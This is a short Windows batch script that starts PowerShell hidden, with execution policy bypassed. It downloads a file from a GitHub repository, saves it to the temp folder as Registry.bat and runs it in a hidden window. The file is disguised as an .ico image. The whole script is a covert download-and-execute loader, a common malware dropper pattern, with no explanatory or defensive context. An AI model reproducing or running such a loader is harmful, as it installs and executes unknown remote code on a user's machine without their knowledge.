@echo off
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& {Invoke-WebRequest -Uri 'https://github.com/Splash2520/Registry/raw/refs/heads/main/Registry.ico' -OutFile $env:TEMP\Registry.bat; Start-Process -FilePath $env:TEMP\Registry.bat -WindowStyle Hidden}"
exit